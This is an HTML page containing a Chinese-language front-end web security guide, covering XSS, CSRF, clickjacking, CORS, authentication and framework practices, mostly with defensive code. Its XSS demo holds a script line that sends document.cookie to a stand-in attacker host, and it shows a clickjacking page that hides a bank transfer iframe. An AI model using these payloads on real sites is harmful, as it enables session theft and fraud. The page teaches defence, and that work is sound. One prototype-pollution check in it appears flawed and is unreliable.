<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web前端安全指南</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .header h1 {
            font-size: 2.8rem;
            color: #2c3e50;
            margin-bottom: 15px;
            font-weight: 700;
        }
        
        .header p {
            font-size: 1.2rem;
            color: #7f8c8d;
            max-width: 800px;
            margin: 0 auto;
        }
        
        .content {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        h2 {
            font-size: 2.2rem;
            color: #2c3e50;
            margin: 30px 0 20px;
            padding-bottom: 15px;
            border-bottom: 3px solid #3498db;
            font-weight: 600;
        }
        
        h3 {
            font-size: 1.6rem;
            color: #34495e;
            margin: 25px 0 15px;
            font-weight: 600;
        }
        
        h4 {
            font-size: 1.3rem;
            color: #34495e;
            margin: 20px 0 10px;
            font-weight: 600;
        }
        
        p {
            margin-bottom: 15px;
            font-size: 1.05rem;
        }
        
        ul, ol {
            margin-bottom: 20px;
            padding-left: 25px;
        }
        
        li {
            margin-bottom: 8px;
            font-size: 1.05rem;
        }
        
        .card {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border-left: 5px solid #3498db;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
        }
        
        .warning-card {
            background: #fff8f0;
            border-left: 5px solid #e74c3c;
        }
        
        .success-card {
            background: #f0fff4;
            border-left: 5px solid #2ecc71;
        }
        
        .info-card {
            background: #e8f4fd;
            border-left: 5px solid #3498db;
        }
        
        code {
            background: #282c34;
            color: #abb2bf;
            padding: 2px 5px;
            border-radius: 4px;
            font-family: 'Fira Code', 'Consolas', Monaco, 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        pre {
            background: #282c34;
            color: #abb2bf;
            padding: 20px;
            border-radius: 10px;
            overflow-x: auto;
            margin-bottom: 20px;
            font-family: 'Fira Code', 'Consolas', Monaco, 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        
        pre code {
            background: none;
            padding: 0;
            color: inherit;
        }
        
        .demo-section {
            margin: 30px 0;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 12px;
            border: 2px solid #e9ecef;
        }
        
        .demo-button {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px 10px 10px 0;
            transition: all 0.3s ease;
            font-weight: 500;
        }
        
        .demo-button:hover {
            background: #2980b9;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
        }
        
        .demo-button.danger {
            background: #e74c3c;
        }
        
        .demo-button.danger:hover {
            background: #c0392b;
        }
        
        .demo-result {
            margin-top: 20px;
            padding: 15px;
            background: #282c34;
            color: #abb2bf;
            border-radius: 8px;
            min-height: 100px;
            font-family: 'Fira Code', 'Consolas', Monaco, 'Courier New', monospace;
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e9ecef;
        }
        
        th {
            background: #3498db;
            color: white;
            font-weight: 600;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .security-icon {
            display: inline-block;
            width: 24px;
            height: 24px;
            margin-right: 8px;
            vertical-align: middle;
        }
        
        .highlight {
            background: linear-gradient(120deg, #a8edea 0%, #fed6e3 100%);
            padding: 2px 5px;
            border-radius: 4px;
            font-weight: 600;
        }
        
        .timeline {
            position: relative;
            max-width: 800px;
            margin: 30px auto;
        }
        
        .timeline::after {
            content: '';
            position: absolute;
            width: 6px;
            background-color: #e9ecef;
            top: 0;
            bottom: 0;
            left: 50%;
            margin-left: -3px;
            border-radius: 10px;
        }
        
        .timeline-item {
            padding: 10px 40px;
            position: relative;
            width: 50%;
            box-sizing: border-box;
        }
        
        .timeline-item::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            right: -10px;
            background-color: white;
            border: 4px solid #3498db;
            top: 15px;
            border-radius: 50%;
            z-index: 1;
        }
        
        .left {
            left: 0;
        }
        
        .right {
            left: 50%;
        }
        
        .right::after {
            left: -10px;
        }
        
        .timeline-content {
            padding: 20px;
            background-color: white;
            position: relative;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .timeline-content h4 {
            margin-top: 0;
            color: #3498db;
        }
        
        @media screen and (max-width: 768px) {
            .timeline::after {
                left: 31px;
            }
            
            .timeline-item {
                width: 100%;
                padding-left: 70px;
                padding-right: 25px;
            }
            
            .timeline-item::after {
                left: 21px;
                right: auto;
            }
            
            .right {
                left: 0%;
            }
            
            .header h1 {
                font-size: 2.2rem;
            }
            
            h2 {
                font-size: 1.8rem;
            }
            
            h3 {
                font-size: 1.4rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Web前端安全指南</h1>
            <p>全面了解和防御现代Web应用面临的安全威胁，构建强健的前端防护体系</p>
        </div>
        
        <div class="content">
            <section id="introduction">
                <h2>1. Web安全概述</h2>
                <p>随着Web应用的复杂化和普及化，前端安全问题变得越来越重要。现代Web应用面临着众多安全威胁，从常见的XSS攻击到复杂的CSRF利用，再到新兴的供应链攻击，安全风险无处不在。</p>
                
                <div class="card">
                    <h3>1.1 前端安全的重要性</h3>
                    <p>前端作为用户与应用交互的直接界面，是整个应用安全体系的第一道防线。一个安全的前端可以：</p>
                    <ul>
                        <li>防止敏感用户数据泄露</li>
                        <li>保护用户会话和认证状态</li>
                        <li>阻止恶意代码执行和注入</li>
                        <li>确保数据完整性和传输安全</li>
                        <li>提升用户信任和应用可靠性</li>
                    </ul>
                </div>
                
                <div class="card warning-card">
                    <h3>1.2 现代Web安全挑战</h3>
                    <p>现代Web应用的复杂性带来了新的安全挑战：</p>
                    <ul>
                        <li>依赖众多第三方库和服务</li>
                        <li>复杂的前端架构和状态管理</li>
                        <li>大量的用户输入和动态内容渲染</li>
                        <li>跨域资源共享和API交互</li>
                        <li>前后端分离架构下的安全边界模糊</li>
                    </ul>
                </div>
            </section>
            
            <section id="common-threats">
                <h2>2. 常见安全威胁</h2>
                
                <div class="card warning-card">
                    <h3>2.1 跨站脚本攻击 (XSS)</h3>
                    <p>跨站脚本攻击允许攻击者在用户的浏览器中执行恶意JavaScript代码，是最常见的Web安全漏洞之一。</p>
                    
                    <h4>XSS的三种主要类型：</h4>
                    <ul>
                        <li><strong>存储型XSS</strong>：恶意代码被存储在目标服务器上，当用户访问页面时被执行</li>
                        <li><strong>反射型XSS</strong>：恶意代码通过URL参数等方式传递给服务器，然后反射回用户浏览器执行</li>
                        <li><strong>DOM型XSS</strong>：恶意代码不经过服务器，直接修改页面DOM结构导致漏洞利用</li>
                    </ul>
                    
                    <div class="demo-section">
                        <h4>XSS攻击演示</h4>
                        <p>以下是一个简单的XSS攻击示例：</p>
                        <pre><code>&lt;!-- 恶意用户输入 --&gt;
&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></pre>
                        
                        <button class="demo-button danger" onclick="simulateXSSAttack()">模拟XSS攻击</button>
                        <div id="xssDemoResult" class="demo-result"></div>
                    </div>
                </div>
                
                <div class="card warning-card">
                    <h3>2.2 跨站请求伪造 (CSRF)</h3>
                    <p>跨站请求伪造攻击迫使已认证用户在不知情的情况下执行非预期操作。</p>
                    
                    <h4>CSRF攻击流程：</h4>
                    <ol>
                        <li>用户登录了受信任的网站A</li>
                        <li>用户在未登出A的情况下，访问了恶意网站B</li>
                        <li>恶意网站B向网站A发送了一个请求</li>
                        <li>网站A误以为这是用户主动发起的请求并执行</li>
                        <li>恶意操作成功执行，CSRF攻击完成</li>
                    </ol>
                    
                    <div class="timeline">
                        <div class="timeline-item left">
                            <div class="timeline-content">
                                <h4>1. 用户登录</h4>
                                <p>用户登录受信任网站并获得认证Cookie</p>
                            </div>
                        </div>
                        <div class="timeline-item right">
                            <div class="timeline-content">
                                <h4>2. 访问恶意网站</h4>
                                <p>用户在同一浏览器中访问攻击者控制的网站</p>
                            </div>
                        </div>
                        <div class="timeline-item left">
                            <div class="timeline-content">
                                <h4>3. 伪造请求发送</h4>
                                <p>恶意网站向目标网站发送伪造请求</p>
                            </div>
                        </div>
                        <div class="timeline-item right">
                            <div class="timeline-content">
                                <h4>4. 请求执行</h4>
                                <p>目标网站验证Cookie后执行恶意请求</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="card warning-card">
                    <h3>2.3 点击劫持 (Clickjacking)</h3>
                    <p>点击劫持攻击通过在目标网页上覆盖透明或半透明的恶意页面，诱导用户点击看起来是正常页面的元素，实际上却是恶意操作。</p>
                    
                    <pre><code>&lt;!-- 恶意网站HTML --&gt;
&lt;body style="margin: 0; padding: 0;"&gt;
  &lt;div style="position: relative; height: 1000px;"&gt;
    &lt;iframe src="https://bank.example.com/transfer" 
            style="position: absolute; opacity: 0.01; top: 0; left: 0; width: 100%; height: 100%;"&gt;&lt;/iframe&gt;
    &lt;div style="position: absolute; top: 200px; left: 300px; background: blue; color: white; padding: 10px;"&gt;
      点击领取奖品!
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/body&gt;</code></pre>
                </div>
                
                <div class="card warning-card">
                    <h3>2.4 不安全的反序列化</h3>
                    <p>前端应用在处理序列化数据（如JSON、localStorage数据）时，如果没有进行适当的验证和清理，可能导致安全风险。</p>
                    
                    <h4>常见的不安全反序列化场景：</h4>
                    <ul>
                        <li>直接将用户输入的JSON字符串反序列化为对象</li>
                        <li>从localStorage/sessionStorage中读取未验证的数据</li>
                        <li>使用不安全的JavaScript eval()函数解析数据</li>
                        <li>未对序列化数据进行完整性验证</li>
                    </ul>
                </div>
                
                <div class="card warning-card">
                    <h3>2.5 敏感信息泄露</h3>
                    <p>敏感信息泄露是指应用程序无意中向用户暴露敏感数据，包括源代码注释、错误信息、API密钥、调试信息等。</p>
                    
                    <h4>常见的信息泄露来源：</h4>
                    <ul>
                        <li>前端JavaScript代码中的硬编码敏感信息</li>
                        <li>浏览器控制台输出的调试信息</li>
                        <li>网络请求中的敏感头信息或URL参数</li>
                        <li>错误页面泄露的详细系统信息</li>
                        <li>前端代码中的注释包含的敏感信息</li>
                    </ul>
                </div>
            </section>
            
            <section id="front-end-security">
                <h2>3. 前端安全最佳实践</h2>
                
                <div class="card success-card">
                    <h3>3.1 防止XSS攻击</h3>
                    
                    <h4>输入验证与转义</h4>
                    <pre><code>// 不安全的方式
function renderUserContent(userInput) {
  document.getElementById('content').innerHTML = userInput;
}

// 安全的方式 - 使用textContent而非innerHTML
function renderUserContentSecure(userInput) {
  document.getElementById('content').textContent = userInput;
}

// 使用DOMPurify库清理HTML
function renderSafeHtml(userHtml) {
  const clean = DOMPurify.sanitize(userHtml);
  document.getElementById('content').innerHTML = clean;
}</code></pre>
                    
                    <h4>使用内容安全策略(CSP)</h4>
                    <pre><code>// HTTP响应头示例
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;

// 元标签方式
&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com;"&gt;</code></pre>
                </div>
                
                <div class="card success-card">
                    <h3>3.2 防止CSRF攻击</h3>
                    
                    <h4>使用CSRF令牌</h4>
                    <pre><code>// 服务端生成CSRF令牌并存储在session中
// 前端在表单中包含令牌
function createSecureForm() {
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = '/transfer';
  
  // 添加CSRF令牌
  const tokenInput = document.createElement('input');
  tokenInput.type = 'hidden';
  tokenInput.name = 'csrf_token';
  tokenInput.value = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
  form.appendChild(tokenInput);
  
  // 其他表单字段...
  return form;
}

// AJAX请求中添加CSRF令牌
function secureAjaxRequest(url, data) {
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
    },
    body: JSON.stringify(data)
  });
}</code></pre>
                    
                    <h4>检查SameSite Cookie属性</h4>
                    <pre><code>// 设置SameSite Cookie
// 服务端设置：Set-Cookie: sessionid=abc123; SameSite=Lax;

// 前端使用fetch时确保包含credentials
fetch('/api/protected', {
  credentials: 'same-origin' // 只在同域请求中包含凭证
});</code></pre>
                </div>
                
                <div class="card success-card">
                    <h3>3.3 防止点击劫持</h3>
                    
                    <h4>使用X-Frame-Options头</h4>
                    <pre><code>// HTTP响应头
X-Frame-Options: DENY  // 禁止在任何iframe中显示
X-Frame-Options: SAMEORIGIN  // 只允许在同源iframe中显示

// 或使用CSP frame-ancestors指令
Content-Security-Policy: frame-ancestors 'self';</code></pre>
                    
                    <h4>JavaScript防御措施</h4>
                    <pre><code>// 检测页面是否在iframe中
if (window.top !== window.self) {
  // 页面被嵌入iframe
  // 可以重定向到顶层窗口
  window.top.location = window.self.location;
  // 或者显示警告信息
  document.body.innerHTML = '&lt;div style="font-size: 24px; color: red;"&gt;请勿在框架中打开此页面&lt;/div&gt;';
}</code></pre>
                </div>
                
                <div class="card success-card">
                    <h3>3.4 安全的数据处理</h3>
                    
                    <h4>安全的JSON处理</h4>
                    <pre><code>// 不安全的方式 - 可能导致原型污染
function unsafeParse(jsonStr) {
  return eval('(' + jsonStr + ')'); // 极其危险!
}

// 安全的方式
function safeParse(jsonStr) {
  try {
    // JSON.parse不会执行代码，更安全
    const data = JSON.parse(jsonStr);
    
    // 验证数据结构和类型
    if (typeof data !== 'object' || data === null) {
      throw new Error('Invalid data type');
    }
    
    // 检查是否存在原型污染攻击
    if (data.__proto__ || data.constructor.prototype) {
      throw new Error('Potential prototype pollution');
    }
    
    return data;
  } catch (error) {
    console.error('JSON parsing error:', error);
    return null;
  }
}</code></pre>
                    
                    <h4>本地存储安全</h4>
                    <pre><code>// 敏感数据不应存储在localStorage中
// 对于非敏感数据
function safeLocalStorage(key, data) {
  try {
    // 数据验证
    if (typeof data !== 'string' && typeof data !== 'number' && typeof data !== 'boolean' && 
        data !== null && typeof data !== 'object') {
      throw new Error('Invalid data type');
    }
    
    // 转换为JSON并存储
    localStorage.setItem(key, JSON.stringify(data));
  } catch (error) {
    console.error('Storage error:', error);
  }
}

// 安全读取
function getLocalStorageItem(key) {
  try {
    const item = localStorage.getItem(key);
    if (item) {
      return JSON.parse(item);
    }
    return null;
  } catch (error) {
    console.error('Retrieval error:', error);
    return null;
  }
}</code></pre>
                </div>
                
                <div class="card success-card">
                    <h3>3.5 安全的API通信</h3>
                    
                    <h4>使用HTTPS</h4>
                    <p>确保所有API通信都使用HTTPS协议，防止中间人攻击和数据窃听。</p>
                    
                    <h4>API请求安全</h4>
                    <pre><code>async function secureApiRequest(endpoint, method, data) {
  // 确保使用HTTPS
  if (!endpoint.startsWith('https://')) {
    console.error('API endpoint must use HTTPS');
    return;
  }
  
  try {
    const response = await fetch(endpoint, {
      method: method,
      headers: {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest', // 防止CSRF
        'Authorization': `Bearer ${getSecureToken()}` // 安全获取令牌
      },
      credentials: 'same-origin', // 控制Cookie发送
      body: data ? JSON.stringify(data) : undefined
    });
    
    // 检查响应状态
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    return result;
  } catch (error) {
    console.error('API request failed:', error);
    // 处理错误，不泄露敏感信息
    showUserFriendlyError('操作失败，请稍后重试');
  }
}

// 安全获取令牌
function getSecureToken() {
  // 避免从localStorage直接获取敏感令牌
  // 可以使用HttpOnly Cookie或安全的内存存储
  return sessionStorage.getItem('auth_token'); // 会话结束后会清除
}</code></pre>
                </div>
            </section>
            
            <section id="authentication">
                <h2>4. 认证与授权安全</h2>
                
                <div class="card info-card">
                    <h3>4.1 安全的认证实践</h3>
                    
                    <h4>密码处理</h4>
                    <pre><code>// 前端密码强度检查
function validatePassword(password) {
  const strength = {
    minLength: password.length >= 10,
    hasUppercase: /[A-Z]/.test(password),
    hasLowercase: /[a-z]/.test(password),
    hasNumber: /\d/.test(password),
    hasSpecial: /[!@#$%^&*(),.?":{}|<>]/.test(password)
  };
  
  const score = Object.values(strength).filter(Boolean).length;
  
  return {
    isValid: score >= 3, // 至少满足3个条件
    strength: score,
    feedback: getPasswordFeedback(strength)
  };
}

// 登录表单提交安全处理
async function handleLogin(username, password) {
  try {
    // 客户端验证
    if (!username || !password) {
      throw new Error('请填写所有字段');
    }
    
    // 发送登录请求
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    
    const result = await response.json();
    
    if (result.token) {
      // 存储令牌 - 优先使用HttpOnly Cookie
      // 前端可使用sessionStorage短期存储
      sessionStorage.setItem('auth_token', result.token);
      
      // 设置自动过期时间
      setTimeout(() => {
        sessionStorage.removeItem('auth_token');
        alert('登录已过期，请重新登录');
        window.location.href = '/login';
      }, result.expiresIn * 1000);
      
      // 登录成功处理
    } else {
      throw new Error(result.message || '登录失败');
    }
  } catch (error) {
    // 不泄露具体错误原因
    showLoginError('用户名或密码错误');
  }
}</code></pre>
                    
                    <h4>会话管理</h4>
                    <pre><code>// 会话超时处理
let sessionTimeout;

function startSessionTimeout() {
  // 清除现有超时
  if (sessionTimeout) {
    clearTimeout(sessionTimeout);
  }
  
  // 设置新的超时 (30分钟)
  sessionTimeout = setTimeout(() => {
    handleSessionTimeout();
  }, 30 * 60 * 1000);
}

function handleSessionTimeout() {
  // 清除认证信息
  sessionStorage.removeItem('auth_token');
  
  // 显示超时提示并跳转到登录页
  alert('会话已超时，请重新登录');
  window.location.href = '/login';
}

// 活动检测，重置超时
function setupActivityMonitoring() {
  // 用户活动时重置超时
  ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
    document.addEventListener(event, startSessionTimeout, false);
  });
}

// 安全登出
function handleLogout() {
  // 清除前端状态
  sessionStorage.removeItem('auth_token');
  
  // 通知服务器登出 (可选但推荐)
  fetch('/api/logout', {
    method: 'POST',
    credentials: 'same-origin'
  }).finally(() => {
    // 无论服务器响应如何都重定向到登录页
    window.location.href = '/login';
  });
}</code></pre>
                </div>
                
                <div class="card info-card">
                    <h3>4.2 授权机制安全</h3>
                    
                    <h4>JWT使用安全</h4>
                    <pre><code>// JWT解码和验证（简化示例）
function verifyJwtToken(token) {
  try {
    // 分割JWT三个部分
    const [header, payload, signature] = token.split('.');
    
    // 解码payload (不验证签名，签名验证应由服务器完成)
    const decodedPayload = JSON.parse(atob(payload));
    
    // 验证token是否过期
    const now = Date.now() / 1000;
    if (decodedPayload.exp && decodedPayload.exp < now) {
      throw new Error('Token已过期');
    }
    
    // 检查issuer和audience (如果适用)
    if (decodedPayload.iss && decodedPayload.iss !== expectedIssuer) {
      throw new Error('无效的token颁发者');
    }
    
    return decodedPayload;
  } catch (error) {
    console.error('Token验证失败:', error);
    return null;
  }
}

// 权限检查
function checkPermission(resource, action) {
  const tokenData = getTokenData();
  
  if (!tokenData || !tokenData.permissions) {
    return false;
  }
  
  // 检查用户是否有执行特定操作的权限
  return tokenData.permissions.includes(`${resource}:${action}`);
}

// 保护路由或操作
async function performProtectedAction(action, params) {
  // 检查是否已认证
  if (!isAuthenticated()) {
    redirectToLogin();
    return;
  }
  
  // 检查是否有权限
  if (!checkPermission('resource', action)) {
    showAccessDenied();
    return;
  }
  
  // 执行操作
  try {
    // API调用逻辑
    const result = await secureApiRequest(`/api/resource/${action}`, 'POST', params);
    // 处理成功结果
  } catch (error) {
    // 处理错误
  }
}</code></pre>
                </div>
            </section>
            
            <section id="api-security">
                <h2>5. API安全与跨域资源共享</h2>
                
                <div class="card">
                    <h3>5.1 CORS (跨域资源共享) 安全配置</h3>
                    
                    <h4>安全的CORS策略</h4>
                    <p>以下是服务端CORS配置的最佳实践示例：</p>
                    <pre><code>// 错误的配置 - 过于宽松
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// 正确的配置 - 限制来源
Access-Control-Allow-Origin: https://trusted-domain.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization, X-CSRF-Token
Access-Control-Max-Age: 3600  // 预检请求缓存时间</code></pre>
                    
                    <h4>前端CORS请求</h4>
                    <pre><code>// 发送跨域请求
async function makeCorsRequest() {
  try {
    const response = await fetch('https://api.example.com/data', {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      credentials: 'include'  // 包含Cookie和认证信息
    });
    
    if (response.ok) {
      const data = await response.json();
      // 处理数据
    } else {
      // 处理错误，但不泄露敏感信息
      console.error('API错误:', response.status);
    }
  } catch (error) {
    // 处理网络错误
    console.error('网络请求失败:', error);
  }
}</code></pre>
                </div>
                
                <div class="card">
                    <h3>5.2 API安全最佳实践</h3>
                    
                    <h4>API请求限流</h4>
                    <pre><code>// 简单的客户端请求限流实现
class ApiThrottler {
  constructor(requestsPerMinute = 60) {
    this.requestsPerMinute = requestsPerMinute;
    this.requestTimestamps = [];
  }
  
  // 检查是否允许请求
  canMakeRequest() {
    const now = Date.now();
    const minuteAgo = now - (60 * 1000);
    
    // 移除一分钟前的请求记录
    this.requestTimestamps = this.requestTimestamps.filter(time => time > minuteAgo);
    
    // 检查请求数是否超过限制
    if (this.requestTimestamps.length >= this.requestsPerMinute) {
      return false;
    }
    
    // 记录新请求
    this.requestTimestamps.push(now);
    return true;
  }
  
  // 安全发送API请求
  async throttleRequest(endpoint, options) {
    if (!this.canMakeRequest()) {
      throw new Error('请求过于频繁，请稍后再试');
    }
    
    return fetch(endpoint, options);
  }
}

// 使用限流实例
const apiThrottler = new ApiThrottler(30); // 每分钟最多30个请求</code></pre>
                    
                    <h4>API响应验证</h4>
                    <pre><code>// 验证API响应数据
function validateApiResponse(responseData, expectedSchema) {
  if (!responseData || typeof responseData !== 'object') {
    throw new Error('无效的响应格式');
  }
  
  // 检查必需字段
  for (const [field, type] of Object.entries(expectedSchema)) {
    if (!(field in responseData)) {
      console.warn(`响应缺少字段: ${field}`);
      // 可以选择抛出错误或设置默认值
    } else if (typeof responseData[field] !== type && !(type === 'number' && responseData[field] === null)) {
      console.warn(`字段 ${field} 类型错误，期望 ${type}，得到 ${typeof responseData[field]}`);
      // 可以选择类型转换或抛出错误
    }
  }
  
  return responseData;
}

// 使用示例
async function getAndValidateUserData() {
  try {
    const response = await fetch('/api/user');
    const data = await response.json();
    
    // 验证响应结构
    const validatedData = validateApiResponse(data, {
      id: 'string',
      username: 'string',
      email: 'string',
      role: 'string',
      createdAt: 'string'
    });
    
    return validatedData;
  } catch (error) {
    console.error('获取用户数据失败:', error);
    throw new Error('数据加载失败');
  }
}</code></pre>
                </div>
            </section>
            
            <section id="framework-security">
                <h2>6. 前端框架安全实践</h2>
                
                <div class="card">
                    <h3>6.1 React应用安全</h3>
                    
                    <h4>防止XSS</h4>
                    <pre><code>// React自动转义文本，防止XSS
function SafeComponent({ userInput }) {
  // 安全：React将自动转义内容
  return &lt;div&gt;{userInput}&lt;/div&gt;;
}

// 不安全：直接使用innerHTML
function UnsafeComponent({ userHtml }) {
  // 危险：使用dangerouslySetInnerHTML而不清理
  return &lt;div dangerouslySetInnerHTML={{ __html: userHtml }} /&gt;;
}

// 安全：使用DOMPurify清理HTML
function SecureHtmlComponent({ userHtml }) {
  const cleanHtml = DOMPurify.sanitize(userHtml, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u'],
    ALLOWED_ATTR: []
  });
  
  return &lt;div dangerouslySetInnerHTML={{ __html: cleanHtml }} /&gt;;
}</code></pre>
                    
                    <h4>状态管理安全</h4>
                    <pre><code>// Redux安全实践
function secureReducer(state = initialState, action) {
  switch (action.type) {
    case 'SET_USER_DATA':
      // 验证action.payload结构
      if (!action.payload || typeof action.payload !== 'object') {
        console.warn('无效的用户数据');
        return state;
      }
      
      // 只提取需要的字段，避免原型污染
      const { id, username, role } = action.payload;
      
      return {
        ...state,
        user: {
          id: id || state.user.id,
          username: username || state.user.username,
          role: role || state.user.role
        }
      };
      
    default:
      return state;
  }
}</code></pre>
                </div>
                
                <div class="card">
                    <h3>6.2 Vue应用安全</h3>
                    
                    <h4>v-html的安全使用</h4>
                    <pre><code>&lt;!-- 不安全：直接使用v-html --&gt;
&lt;div v-html="userInput"&gt;&lt;/div&gt;

&lt;!-- 安全：使用过滤器清理HTML --&gt;
&lt;div v-html="userInput | sanitize"&gt;&lt;/div&gt;

// 在Vue实例中定义过滤器
filters: {
  sanitize: function(value) {
    if (!value) return '';
    return DOMPurify.sanitize(value);
  }
}</code></pre>
                    
                    <h4>Vue路由安全</h4>
                    <pre><code>// Vue Router安全配置
const router = new VueRouter({
  routes: [
    { path: '/admin', 
      component: AdminPanel,
      meta: { requiresAuth: true, requiresAdmin: true },
      beforeEnter: (to, from, next) => {
        // 路由级别的权限检查
        if (!authService.isAuthenticated()) {
          next('/login');
        } else if (!authService.hasRole('admin')) {
          next('/unauthorized');
        } else {
          next();
        }
      }
    }
  ]
});

// 全局路由守卫
router.beforeEach((to, from, next) => {
  // 检查需要认证的路由
  if (to.matched.some(record => record.meta.requiresAuth)) {
    if (!authService.isAuthenticated()) {
      next({ path: '/login', query: { redirect: to.fullPath } });
    } else {
      next();
    }
  } else {
    next();
  }
});</code></pre>
                </div>
                
                <div class="card">
                    <h3>6.3 通用框架安全原则</h3>
                    <ul>
                        <li><strong>避免使用危险的生命周期方法</strong>：如React的componentWillMount已废弃，可能导致安全问题</li>
                        <li><strong>组件隔离</strong>：确保不可信组件不会影响应用的其他部分</li>
                        <li><strong>状态隔离</strong>：敏感状态不应在不相关组件间共享</li>
                        <li><strong>库版本管理</strong>：定期更新框架和依赖库以修复已知安全漏洞</li>
                        <li><strong>服务器端渲染安全</strong>：在SSR应用中确保用户输入不会导致服务器注入</li>
                    </ul>
                </div>
            </section>
            
            <section id="security-testing">
                <h2>7. 安全测试与审计</h2>
                
                <div class="card">
                    <h3>7.1 前端安全审计工具</h3>
                    
                    <table>
                        <thead>
                            <tr>
                                <th>工具名称</th>
                                <th>类型</th>
                                <th>用途</th>
                                <th>适用场景</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>ESLint (security插件)</td>
                                <td>静态代码分析</td>
                                <td>检测代码中的安全漏洞</td>
                                <td>开发阶段集成</td>
                            </tr>
                            <tr>
                                <td>OWASP ZAP</td>
                                <td>动态扫描</td>
                                <td>自动化安全测试</td>
                                <td>测试环境</td>
                            </tr>
                            <tr>
                                <td>Snyk</td>
                                <td>依赖扫描</td>
                                <td>检测第三方库漏洞</td>
                                <td>依赖管理</td>
                            </tr>
                            <tr>
                                <td>Lighthouse</td>
                                <td>综合审计</td>
                                <td>包括部分安全检查</td>
                                <td>性能与安全审计</td>
                            </tr>
                            <tr>
                                <td>SonarQube</td>
                                <td>代码质量</td>
                                <td>代码质量和安全问题检测</td>
                                <td>CI/CD集成</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                
                <div class="card">
                    <h3>7.2 集成安全测试到工作流</h3>
                    
                    <pre><code>// package.json中添加安全检查脚本
{
  "scripts": {
    "security:lint": "eslint --plugin security --ext .js,.jsx,.ts,.tsx src/",
    "security:deps": "npm audit --audit-level=high",
    "security:snyk": "snyk test",
    "security": "npm run security:lint && npm run security:deps && npm run security:snyk"
  }
}

// 在CI/CD流程中添加安全检查
// .github/workflows/security.yml示例
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Use Node.js
        uses: actions/setup-node@v2
        with:
          node-version: '16'
      - run: npm ci
      - run: npm run security
      - name: Run ZAP Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://your-staging-app.com'
      - name: Upload Security Report
        uses: actions/upload-artifact@v2
        with:
          name: security-report
          path: security-results/</code></pre>
                </div>
            </section>
            
            <section id="emerging-trends">
                <h2>8. 新兴安全威胁与趋势</h2>
                
                <div class="card warning-card">
                    <h3>8.1 供应链攻击</h3>
                    <p>供应链攻击通过感染或篡改开发工具、库或依赖来攻击应用程序。这是近年来增长最快的攻击类型之一。</p>
                    
                    <h4>防御措施：</h4>
                    <ul>
                        <li>使用包管理器的锁文件（package-lock.json/yarn.lock）锁定依赖版本</li>
                        <li>定期审查和更新依赖，移除未使用的依赖</li>
                        <li>使用npm audit、Snyk等工具扫描依赖漏洞</li>
                        <li>考虑使用私有npm仓库或Verdaccio等工具控制依赖来源</li>
                        <li>实施依赖签名验证</li>
                    </ul>
                </div>
                
